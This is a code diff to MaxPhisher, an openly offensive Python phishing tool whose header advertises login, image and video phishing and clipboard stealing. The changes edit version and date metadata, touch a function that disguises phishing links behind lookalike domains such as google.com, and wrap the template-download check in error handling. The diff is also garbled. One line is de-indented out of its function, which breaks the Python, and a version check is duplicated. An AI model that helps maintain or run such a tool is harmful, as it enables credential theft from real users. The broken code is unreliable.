@@ -1,14 +1,14 @@
 # -*- coding: UTF-8 -*-
 # ToolName   : MaxPhisher
 # Author     : KasRoudra
-# Version    : 1.1
+# Version    : 1.5
 # License    : MIT
-# Copyright  : KasRoudra (2021-2022)
+# Copyright  : KasRoudra (2024-2025)
 # Github     : https://github.com/KasRoudra
 # Contact    : https://m.me/KasRoudra
 # Description: MaxPhisher is a phishing tool in python
 # Tags       : Multi phishing, login phishing, image phishing, video phishing, clipboard steal
-# 1st Commit : 08/9/2022
+# 1st Commit : 01/7/2025
 # Language   : Python
 # Portable file/script
 # If you copy open source code, consider giving credit
@@ -1015,7 +1015,7 @@ def masking(url):
         waiter()
     short = shortened.replace("https://", "")
     # Remove slash and spaces from inputs
-    domain = input(f"\n{ask}Enter custom domain(Example: google.com, yahoo.com > ")
+domain = input(f"\n{ask}Enter custom domain(Example: google.com, yahoo.com > ")
     if domain == "":
         sprint(f"\n{error}No domain!")
         domain = "https://"
@@ -1186,11 +1186,16 @@ def requirements():
     if isfile(f"{sites_dir}/version.txt"):
         with open(f"{sites_dir}/version.txt", "r") as sites_file:
             zipver=sites_file.read().strip()
-            if float(version) > float(zipver):
-                # download(websites_url, "maxsites.zip")
-                print(f"\n{info2}Downloading website files....{nc}")
-                delete(sites_dir)
-                shell(f"git clone {sites_repo} {sites_dir}")
+    if isfile(f"{sites_dir}/version.txt"):
+        with open(f"{sites_dir}/version.txt", "r") as sites_file:
+            zipver = sites_file.read().strip()
+            try:
+                if float(version) > float(zipver):
+                    print(f"\n{info2}Downloading website files....{nc}")
+                    delete(sites_dir)
+                    shell(f"git clone {sites_repo} {sites_dir}")
+            except ValueError:
+                print(f"{warn}Version check failed. Skipping site update.")
                 # shell(f"cd {sites_dir} && git pull")
     else:
         # download(websites_url, "maxsites.zip")
